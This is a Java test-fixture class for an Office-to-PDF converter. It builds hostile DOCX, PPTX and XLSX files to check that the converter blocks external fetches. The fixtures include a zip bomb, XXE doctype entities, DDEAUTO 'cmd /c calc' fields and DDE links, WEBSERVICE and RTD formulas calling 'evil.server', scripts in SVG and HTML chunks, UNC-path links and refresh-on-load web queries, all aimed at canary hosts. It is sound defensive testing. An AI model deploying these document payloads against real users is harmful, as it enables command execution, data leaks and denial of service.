package stirling.software.officeconvert.topdf.testing;

import java.awt.Color;
import java.awt.Graphics2D;
import java.awt.geom.Rectangle2D;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.UncheckedIOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;

import javax.imageio.ImageIO;

import org.apache.poi.poifs.filesystem.POIFSFileSystem;
import org.apache.poi.ss.usermodel.Row;
import org.apache.poi.ss.usermodel.Sheet;
import org.apache.poi.xslf.usermodel.XMLSlideShow;
import org.apache.poi.xslf.usermodel.XSLFSlide;
import org.apache.poi.xslf.usermodel.XSLFTextBox;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;
import org.apache.poi.xwpf.usermodel.XWPFDocument;

import stirling.software.officeconvert.topdf.io.OfficeZip;

public final class Fixtures {

    public static final String REL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/";

    public static final String MS_REL = "http://schemas.microsoft.com/office/2006/relationships/";

    public static final String MS_REL_2007 = "http://schemas.microsoft.com/office/2007/relationships/";

    public static final String MS_REL_2011 = "http://schemas.microsoft.com/office/2011/relationships/";

    public static final String STRICT_REL = "http://purl.oclc.org/ooxml/officeDocument/relationships/";

    private static final String R_NS = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";

    private static final String A_NS = "http://schemas.openxmlformats.org/drawingml/2006/main";

    private static final String PIC_NS = "http://schemas.openxmlformats.org/drawingml/2006/picture";

    private static final String WP_NS = "http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing";

    private Fixtures() {}

    public static byte[] docx(String... paragraphs) {
        try (XWPFDocument doc = new XWPFDocument(); ByteArrayOutputStream out = new ByteArrayOutputStream()) {
            for (String p : paragraphs) {
                doc.createParagraph().createRun().setText(p);
            }
            doc.write(out);
            return out.toByteArray();
        } catch (IOException e) {
            throw new UncheckedIOException(e);
        }
    }

    public static byte[] pptx(String... slideTexts) {
        try (XMLSlideShow ppt = new XMLSlideShow(); ByteArrayOutputStream out = new ByteArrayOutputStream()) {
            for (String text : slideTexts) {
                XSLFSlide slide = ppt.createSlide();
                XSLFTextBox box = slide.createTextBox();
                box.setAnchor(new Rectangle2D.Double(50, 50, 500, 100));
                box.setText(text);
            }
            ppt.write(out);
            return out.toByteArray();
        } catch (IOException e) {
            throw new UncheckedIOException(e);
        }
    }

    public static byte[] xlsx(String[][] rows) {
        try (XSSFWorkbook wb = new XSSFWorkbook(); ByteArrayOutputStream out = new ByteArrayOutputStream()) {
            Sheet sheet = wb.createSheet("Sheet1");
            for (int r = 0; r < rows.length; r++) {
                Row row = sheet.createRow(r);
                for (int c = 0; c < rows[r].length; c++) {
                    row.createCell(c).setCellValue(rows[r][c]);
                }
            }
            wb.write(out);
            return out.toByteArray();
        } catch (IOException e) {
            throw new UncheckedIOException(e);
        }
    }

    public static byte[] png(int width, int height, Color color) {
        BufferedImage img = new BufferedImage(width, height, BufferedImage.TYPE_INT_ARGB);
        Graphics2D g = img.createGraphics();
        try {
            g.setColor(color);
            g.fillRect(0, 0, width, height);
        } finally {
            g.dispose();
        }
        try (ByteArrayOutputStream out = new ByteArrayOutputStream()) {
            ImageIO.write(img, "png", out);
            return out.toByteArray();
        } catch (IOException e) {
            throw new UncheckedIOException(e);
        }
    }

    public static byte[] encryptedOle2() {
        try (POIFSFileSystem fs = new POIFSFileSystem(); ByteArrayOutputStream out = new ByteArrayOutputStream()) {
            fs.createDocument(new ByteArrayInputStream(new byte[128]), "EncryptionInfo");
            fs.createDocument(new ByteArrayInputStream(new byte[4096]), "EncryptedPackage");
            fs.writeFilesystem(out);
            return out.toByteArray();
        } catch (IOException e) {
            throw new UncheckedIOException(e);
        }
    }

    public static byte[] zipBomb(byte[] office, String part, long zeros) {
        try (ByteArrayOutputStream bytes = new ByteArrayOutputStream(); ZipOutputStream out = new ZipOutputStream(bytes)) {
            for (Map.Entry<String, byte[]> e : edit(office).parts.entrySet()) {
                out.putNextEntry(new ZipEntry(e.getKey()));
                out.write(e.getValue());
                out.closeEntry();
            }
            out.putNextEntry(new ZipEntry(part));
            byte[] block = new byte[1 << 16];
            for (long left = zeros; left > 0; left -= block.length) {
                out.write(block, 0, (int) Math.min(block.length, left));
            }
            out.closeEntry();
            out.finish();
            return bytes.toByteArray();
        } catch (IOException e) {
            throw new UncheckedIOException(e);
        }
    }

    public static byte[] lyingSize(byte[] zip, String entry, int declared) {
        byte[] out = zip.clone();
        byte[] name = entry.getBytes(StandardCharsets.UTF_8);
        for (int i = 0; i + 46 < out.length; i++) {
            if (le32(out, i) != 0x02014b50) {
                continue;
            }
            int nameLen = le16(out, i + 28);
            if (nameLen == name.length && regionEquals(out, i + 46, name)) {
                out[i + 24] = (byte) declared;
                out[i + 25] = (byte) (declared >> 8);
                out[i + 26] = (byte) (declared >> 16);
                out[i + 27] = (byte) (declared >> 24);
                return out;
            }
        }
        throw new IllegalArgumentException("No central directory entry " + entry);
    }

    public static Path write(Path dir, String name, byte[] data) {
        try {
            return Files.write(dir.resolve(name), data);
        } catch (IOException e) {
            throw new UncheckedIOException(e);
        }
    }

    public static Zip edit(byte[] zip) {
        return new Zip(zip);
    }

    public static byte[] hostileDocx(NoNetwork net) {
        byte[] pixel = png(4, 4, Color.RED);
        Zip z = edit(docx("Hostile document", "Body text stays"));
        String settings = z.has("word/settings.xml") ? "/word/settings.xml" : "/word/document.xml";
        z.relationship(settings, "rIdTpl", REL + "attachedTemplate", net.url("template.dotm"), true);
        z.relationship(settings, "rIdMerge", REL + "mailMergeSource", net.url("data.csv"), true);
        z.relationship("/word/document.xml", "rIdLinked", REL + "image", net.url("linked.png"), true);
        z.relationship("/word/document.xml", "rIdSub", REL + "subDocument", net.uncPath("sub.docx"), true);
        z.relationship("/word/document.xml", "rIdFrame", REL + "frame", net.canaryUrl("frame.html"), true);
        z.relationship("/word/document.xml", "rIdLink", REL + "hyperlink", net.url("hyperlink"), true);
        z.relationship("/word/document.xml", "rIdOle", REL + "oleObject", net.fileUrl("object.xlsx"), true);
        z.relationship("/word/document.xml", "rIdVideo", REL + "video", net.url("video.mp4"), true);
        z.relationship("/word/document.xml", "rIdChunk", REL + "aFChunk", "afchunk.htm", false);
        z.put("word/afchunk.htm", "<html><head><link rel=\"stylesheet\" href=\"" + net.url("style.css")
                + "\"></head><body><img src=\"" + net.url("chunk.png") + "\"><script src=\"" + net.url("x.js")
                + "\"></script>ALTCHUNK</body></html>");
        z.override("/word/afchunk.htm", "text/html");
        z.put("word/media/fallback.png", pixel);
        z.defaultType("png", "image/png");
        z.relationship("/word/document.xml", "rIdPng", REL + "image", "media/fallback.png", false);
        z.put("word/media/vector.svg", "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\""
                + " width=\"10\" height=\"10\"><image xlink:href=\"" + net.url("svg.png") + "\" width=\"10\" height=\"10\"/>"
                + "<script>fetch('" + net.url("svg-script") + "')</script></svg>");
        z.defaultType("svg", "image/svg+xml");
        z.relationship("/word/document.xml", "rIdSvg", MS_REL_2007 + "image", "media/vector.svg", false);
        z.put("word/vbaProject.bin", new byte[] {(byte) 0xD0, (byte) 0xCF, 0x11, (byte) 0xE0, 1, 2, 3, 4});
        z.override("/word/vbaProject.bin", "application/vnd.ms-office.vbaProject");
        z.relationship("/word/document.xml", "rIdVba", MS_REL + "vbaProject", "vbaProject.bin", false);
        z.put("word/activeX/activeX1.xml", "<ax:ocx xmlns:ax=\"http://schemas.microsoft.com/office/2006/activeX\""
                + " ax:classid=\"{8856F961-340A-11D0-A96B-00C04FD705A2}\"><ax:ocxPr ax:name=\"Location\" ax:value=\""
                + net.url("activex") + "\"/></ax:ocx>");
        z.override("/word/activeX/activeX1.xml", "application/vnd.ms-office.activeX+xml");
        z.relationship("/word/document.xml", "rIdAx", REL + "control", "activeX/activeX1.xml", false);
        webExtension(z, net, "word");
        customUi(z);
        String body = "<w:p><w:r><w:t>Before fields</w:t></w:r></w:p>"
                + field("INCLUDEPICTURE \"" + net.url("include.png") + "\" \\d", "CACHED-INCLUDEPICTURE")
                + field("INCLUDETEXT \"" + net.uncPath("include.docx") + "\"", "CACHED-INCLUDETEXT")
                + field("DDEAUTO \"cmd\" \"/c calc\"", "CACHED-DDE")
                + field("HYPERLINK \"" + net.url("field-link") + "\"", "CACHED-HYPERLINK")
                + field("PAGE", "1")
                + "<w:p><w:hyperlink xmlns:r=\"" + R_NS + "\" r:id=\"rIdLink\"><w:r><w:t>external link</w:t></w:r>"
                + "</w:hyperlink></w:p>"
                + "<w:altChunk xmlns:r=\"" + R_NS + "\" r:id=\"rIdChunk\"/>"
                + "<w:p><w:r>" + inlinePicture("r:link=\"rIdLinked\"", 1) + "</w:r></w:p>"
                + "<w:p><w:r>" + inlinePicture("r:embed=\"rIdPng\"><a:extLst><a:ext uri=\"{96DAC541-7B7A-43D3-8B79-37D633B846F1}\">"
                        + "<asvg:svgBlip xmlns:asvg=\"http://schemas.microsoft.com/office/drawing/2016/SVG/main\""
                        + " r:embed=\"rIdSvg\"/></a:ext></a:extLst></a:blip", 2) + "</w:r></w:p>"
                + "<w:p><w:r><w:t>After fields</w:t></w:r></w:p>";
        z.insertBeforeBodyEnd(body);
        return z.bytes();
    }

    public static byte[] doctypeDocx(NoNetwork net) {
        Zip z = edit(docx("Doctype document"));
        String doctype = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?><!DOCTYPE x SYSTEM \""
                + net.url("evil.dtd") + "\" [<!ENTITY xxe SYSTEM \"" + net.url("xxe") + "\">]>";
        String core = z.text("docProps/core.xml").replaceFirst("^<\\?xml[^>]*\\?>", "");
        z.put("docProps/core.xml", doctype + core);
        String doc = z.text("word/document.xml").replaceFirst("^<\\?xml[^>]*\\?>", "");
        z.put("word/document.xml", doctype + doc.replace("Doctype document", "&xxe;"));
        return z.bytes();
    }

    public static byte[] hostilePptx(NoNetwork net) {
        Zip z = edit(pptx("Hostile slide", "Second slide"));
        String slide = "/ppt/slides/slide1.xml";
        z.relationship(slide, "rIdLinked", REL + "image", net.url("linked.png"), true);
        z.relationship(slide, "rIdVideo", REL + "video", net.url("video.mp4"), true);
        z.relationship(slide, "rIdMedia", MS_REL_2007 + "media", net.url("media.mp4"), true);
        z.relationship(slide, "rIdAudio", REL + "audio", net.uncPath("sound.wav"), true);
        z.relationship(slide, "rIdOle", REL + "oleObject", net.fileUrl("object.xlsx"), true);
        z.relationship(slide, "rIdLink", REL + "hyperlink", net.url("hyperlink"), true);
        z.relationship("/ppt/presentation.xml", "rIdUpd", REL + "slideUpdateUrl", net.url("library"), true);
        z.put("ppt/vbaProject.bin", new byte[] {(byte) 0xD0, (byte) 0xCF, 0x11, (byte) 0xE0});
        z.override("/ppt/vbaProject.bin", "application/vnd.ms-office.vbaProject");
        z.relationship("/ppt/presentation.xml", "rIdVba", MS_REL + "vbaProject", "vbaProject.bin", false);
        webExtension(z, net, "ppt");
        customUi(z);
        String pic = "<p:pic xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\" xmlns:a=\"" + A_NS
                + "\" xmlns:r=\"" + R_NS + "\"><p:nvPicPr><p:cNvPr id=\"90\" name=\"Linked\">"
                + "<a:hlinkClick r:id=\"rIdLink\"/></p:cNvPr><p:cNvPicPr/><p:nvPr><a:videoFile r:link=\"rIdVideo\"/>"
                + "</p:nvPr></p:nvPicPr><p:blipFill><a:blip r:link=\"rIdLinked\"/><a:stretch><a:fillRect/></a:stretch>"
                + "</p:blipFill><p:spPr><a:xfrm><a:off x=\"914400\" y=\"1828800\"/><a:ext cx=\"914400\" cy=\"914400\"/>"
                + "</a:xfrm><a:prstGeom prst=\"rect\"><a:avLst/></a:prstGeom></p:spPr></p:pic>";
        z.insertBefore(slide.substring(1), "</p:spTree>", pic);
        return z.bytes();
    }

    public static byte[] hostileXlsx(NoNetwork net) {
        Zip z = edit(xlsx(new String[][] {{"Hostile", "sheet"}, {"a", "b"}}));
        String sheet = "xl/worksheets/sheet1.xml";
        z.put(sheet, "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>"
                + "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:r=\"" + R_NS + "\">"
                + "<sheetData><row r=\"1\"><c r=\"A1\" t=\"inlineStr\"><is><t>Hostile</t></is></c>"
                + "<c r=\"B1\" t=\"str\"><f>WEBSERVICE(\"" + net.url("webservice") + "\")</f><v>CACHED-WEB</v></c>"
                + "<c r=\"C1\"><f>[1]Sheet1!A1</f><v>42</v></c>"
                + "<c r=\"D1\" t=\"str\"><f>HYPERLINK(\"" + net.url("formula-link") + "\",\"go\")</f><v>go</v></c>"
                + "<c r=\"E1\" t=\"str\"><f>RTD(\"evil.server\",,\"topic\")</f><v>CACHED-RTD</v></c>"
                + "</row></sheetData>"
                + "<hyperlinks><hyperlink ref=\"A1\" r:id=\"rIdLink\"/></hyperlinks></worksheet>");
        z.relationship("/" + sheet, "rIdLink", REL + "hyperlink", net.url("hyperlink"), true);
        z.put("xl/externalLinks/externalLink1.xml", "<externalLink xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\""
                + " xmlns:r=\"" + R_NS + "\"><externalBook r:id=\"rId1\"><sheetNames><sheetName val=\"Sheet1\"/></sheetNames>"
                + "<sheetDataSet><sheetData sheetId=\"0\"><row r=\"1\"><cell r=\"A1\"><v>42</v></cell></row></sheetData>"
                + "</sheetDataSet></externalBook></externalLink>");
        z.override("/xl/externalLinks/externalLink1.xml",
                "application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml");
        z.relationship("/xl/externalLinks/externalLink1.xml", "rId1", REL + "externalLinkPath", net.uncPath("book.xlsx"), true);
        z.put("xl/externalLinks/externalLink2.xml", "<externalLink xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\">"
                + "<ddeLink ddeService=\"cmd\" ddeTopic=\"/c calc\"><ddeItems><ddeItem name=\"A0\" advise=\"1\"/></ddeItems>"
                + "</ddeLink></externalLink>");
        z.override("/xl/externalLinks/externalLink2.xml",
                "application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml");
        z.relationship("/xl/workbook.xml", "rIdExt1", REL + "externalLink", "externalLinks/externalLink1.xml", false);
        z.relationship("/xl/workbook.xml", "rIdExt2", REL + "externalLink", "externalLinks/externalLink2.xml", false);
        z.insertAfter("xl/workbook.xml", "</sheets>", "<externalReferences><externalReference xmlns:r=\"" + R_NS
                + "\" r:id=\"rIdExt1\"/><externalReference xmlns:r=\"" + R_NS + "\" r:id=\"rIdExt2\"/></externalReferences>");
        z.put("xl/connections.xml", "<connections xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\">"
                + "<connection id=\"1\" name=\"web\" type=\"4\" refreshedVersion=\"6\" refreshOnLoad=\"1\" background=\"1\">"
                + "<webPr sourceData=\"1\" url=\"" + net.url("query") + "\"/></connection>"
                + "<connection id=\"2\" name=\"odc\" type=\"5\" refreshOnLoad=\"1\" odcFile=\"" + net.uncPath("x.odc")
                + "\"><dbPr connection=\"Provider=MSOLEDBSQL;Data Source=" + NoNetwork.CANARY_HOST
                + "\" command=\"select 1\"/></connection></connections>");
        z.override("/xl/connections.xml", "application/vnd.openxmlformats-officedocument.spreadsheetml.connections+xml");
        z.relationship("/xl/workbook.xml", "rIdConn", REL + "connections", "connections.xml", false);
        z.put("xl/queryTables/queryTable1.xml", "<queryTable xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\""
                + " name=\"q\" connectionId=\"1\" refreshOnLoad=\"1\"/>");
        z.override("/xl/queryTables/queryTable1.xml",
                "application/vnd.openxmlformats-officedocument.spreadsheetml.queryTable+xml");
        z.relationship("/" + sheet, "rIdQuery", REL + "queryTable", "../queryTables/queryTable1.xml", false);
        z.put("xl/vbaProject.bin", new byte[] {(byte) 0xD0, (byte) 0xCF, 0x11, (byte) 0xE0});
        z.override("/xl/vbaProject.bin", "application/vnd.ms-office.vbaProject");
        z.relationship("/xl/workbook.xml", "rIdVba", MS_REL + "vbaProject", "vbaProject.bin", false);
        webExtension(z, net, "xl");
        customUi(z);
        return z.bytes();
    }

    private static void webExtension(Zip z, NoNetwork net, String dir) {
        String ext = dir + "/webextensions/webextension1.xml";
        String panes = dir + "/webextensions/taskpanes.xml";
        z.put(ext, "<we:webextension xmlns:we=\"http://schemas.microsoft.com/office/webextensions/webextension/2010/11\""
                + " id=\"{00000000-0000-0000-0000-000000000001}\"><we:reference id=\"wa000000001\" version=\"1.0.0.0\""
                + " store=\"" + net.url("store") + "\" storeType=\"OMEX\"/><we:properties/><we:bindings/>"
                + "<we:snapshot xmlns:r=\"" + R_NS + "\"/></we:webextension>");
        z.override("/" + ext, "application/vnd.ms-office.webextension+xml");
        z.put(panes, "<wetp:taskpanes xmlns:wetp=\"http://schemas.microsoft.com/office/webextensions/taskpanes/2010/11\""
                + " xmlns:r=\"" + R_NS + "\"><wetp:taskpane dockstate=\"right\" visibility=\"1\" width=\"350\" row=\"1\">"
                + "<wetp:webextensionref r:id=\"rIdWe\"/></wetp:taskpane></wetp:taskpanes>");
        z.override("/" + panes, "application/vnd.ms-office.webextensiontaskpanes+xml");
        z.relationship("/" + panes, "rIdWe", MS_REL_2011 + "webextension", "webextension1.xml", false);
        z.relationship("/", "rIdPanes", MS_REL_2011 + "webextensiontaskpanes", panes, false);
    }

    private static void customUi(Zip z) {
        z.put("customUI/customUI14.xml", "<customUI xmlns=\"http://schemas.microsoft.com/office/2009/07/customui\""
                + " onLoad=\"AutoOpen\"><ribbon/></customUI>");
        z.relationship("/", "rIdUi", MS_REL_2007 + "ui/extensibility", "customUI/customUI14.xml", false);
    }

    private static String field(String instruction, String cached) {
        String instr = escape(instruction);
        return "<w:p><w:r><w:fldChar w:fldCharType=\"begin\"/></w:r><w:r><w:instrText xml:space=\"preserve\"> " + instr
                + " </w:instrText></w:r><w:r><w:fldChar w:fldCharType=\"separate\"/></w:r><w:r><w:t>" + escape(cached)
                + "</w:t></w:r><w:r><w:fldChar w:fldCharType=\"end\"/></w:r></w:p>"
                + "<w:p><w:fldSimple w:instr=\"" + instr + "\"><w:r><w:t>" + escape(cached) + "</w:t></w:r></w:fldSimple></w:p>";
    }

    private static String inlinePicture(String blip, int id) {
        String open = blip.startsWith("r:link") && !blip.contains("<") ? "<a:blip " + blip + "/>" : "<a:blip " + blip + ">";
        return "<w:drawing><wp:inline xmlns:wp=\"" + WP_NS + "\" distT=\"0\" distB=\"0\" distL=\"0\" distR=\"0\">"
                + "<wp:extent cx=\"952500\" cy=\"952500\"/><wp:docPr id=\"" + id + "\" name=\"Picture " + id + "\"/>"
                + "<a:graphic xmlns:a=\"" + A_NS + "\"><a:graphicData uri=\"" + PIC_NS + "\"><pic:pic xmlns:pic=\""
                + PIC_NS + "\" xmlns:r=\"" + R_NS + "\"><pic:nvPicPr><pic:cNvPr id=\"" + id + "\" name=\"p" + id + "\"/>"
                + "<pic:cNvPicPr/></pic:nvPicPr><pic:blipFill>" + open + "<a:stretch><a:fillRect/></a:stretch>"
                + "</pic:blipFill><pic:spPr><a:xfrm><a:off x=\"0\" y=\"0\"/><a:ext cx=\"952500\" cy=\"952500\"/></a:xfrm>"
                + "<a:prstGeom prst=\"rect\"><a:avLst/></a:prstGeom></pic:spPr></pic:pic></a:graphicData></a:graphic>"
                + "</wp:inline></w:drawing>";
    }

    static String escape(String s) {
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;");
    }

    private static int le16(byte[] d, int i) {
        return (d[i] & 0xFF) | (d[i + 1] & 0xFF) << 8;
    }

    private static int le32(byte[] d, int i) {
        return (d[i] & 0xFF) | (d[i + 1] & 0xFF) << 8 | (d[i + 2] & 0xFF) << 16 | (d[i + 3] & 0xFF) << 24;
    }

    private static boolean regionEquals(byte[] d, int at, byte[] what) {
        for (int k = 0; k < what.length; k++) {
            if (d[at + k] != what[k]) {
                return false;
            }
        }
        return true;
    }

    public static final class Zip {

        private final Map<String, byte[]> parts = new LinkedHashMap<>();

        Zip(byte[] zip) {
            try (ZipInputStream in = new ZipInputStream(new ByteArrayInputStream(zip))) {
                for (ZipEntry e = in.getNextEntry(); e != null; e = in.getNextEntry()) {
                    if (!e.isDirectory()) {
                        parts.put(e.getName(), in.readAllBytes());
                    }
                }
            } catch (IOException e) {
                throw new UncheckedIOException(e);
            }
        }

        public boolean has(String part) {
            return parts.containsKey(strip(part));
        }

        public String text(String part) {
            byte[] b = parts.get(strip(part));
            if (b == null) {
                throw new IllegalArgumentException("No part " + part);
            }
            return new String(b, StandardCharsets.UTF_8);
        }

        public Zip put(String part, byte[] data) {
            parts.put(strip(part), data.clone());
            return this;
        }

        public Zip put(String part, String text) {
            return put(part, text.getBytes(StandardCharsets.UTF_8));
        }

        public Zip remove(String part) {
            parts.remove(strip(part));
            return this;
        }

        public Zip insertBefore(String part, String marker, String xml) {
            String t = text(part);
            int at = t.indexOf(marker);
            if (at < 0) {
                throw new IllegalArgumentException(part + " has no " + marker);
            }
            return put(part, t.substring(0, at) + xml + t.substring(at));
        }

        public Zip insertAfter(String part, String marker, String xml) {
            String t = text(part);
            int at = t.indexOf(marker);
            if (at < 0) {
                throw new IllegalArgumentException(part + " has no " + marker);
            }
            at += marker.length();
            return put(part, t.substring(0, at) + xml + t.substring(at));
        }

        public Zip insertBeforeBodyEnd(String xml) {
            String t = text("word/document.xml");
            int sect = t.lastIndexOf("<w:sectPr");
            int end = t.lastIndexOf("</w:body>");
            int at = sect >= 0 && sect < end ? sect : end;
            return put("word/document.xml", t.substring(0, at) + xml + t.substring(at));
        }

        public Zip relationship(String sourcePart, String id, String type, String target, boolean external) {
            String rels = strip(OfficeZip.relsPartFor(sourcePart));
            if (!has(rels)) {
                put(rels, "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>"
                        + "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">"
                        + "</Relationships>");
            }
            String rel = "<Relationship Id=\"" + escape(id) + "\" Type=\"" + escape(type) + "\" Target=\""
                    + escape(target) + "\"" + (external ? " TargetMode=\"External\"" : "") + "/>";
            return insertBefore(rels, "</Relationships>", rel);
        }

        public Zip override(String partName, String contentType) {
            String name = partName.startsWith("/") ? partName : "/" + partName;
            return insertBefore("[Content_Types].xml", "</Types>", "<Override PartName=\"" + escape(name)
                    + "\" ContentType=\"" + escape(contentType) + "\"/>");
        }

        public Zip defaultType(String extension, String contentType) {
            if (text("[Content_Types].xml").contains("Extension=\"" + extension + "\"")) {
                return this;
            }
            return insertBefore("[Content_Types].xml", "</Types>", "<Default Extension=\"" + escape(extension)
                    + "\" ContentType=\"" + escape(contentType) + "\"/>");
        }

        public byte[] bytes() {
            try (ByteArrayOutputStream bytes = new ByteArrayOutputStream(); ZipOutputStream out = new ZipOutputStream(bytes)) {
                for (Map.Entry<String, byte[]> e : parts.entrySet()) {
                    out.putNextEntry(new ZipEntry(e.getKey()));
                    out.write(e.getValue());
                    out.closeEntry();
                }
                out.finish();
                return bytes.toByteArray();
            } catch (IOException e) {
                throw new UncheckedIOException(e);
            }
        }

        private static String strip(String part) {
            return part.startsWith("/") ? part.substring(1) : part;
        }
    }
}
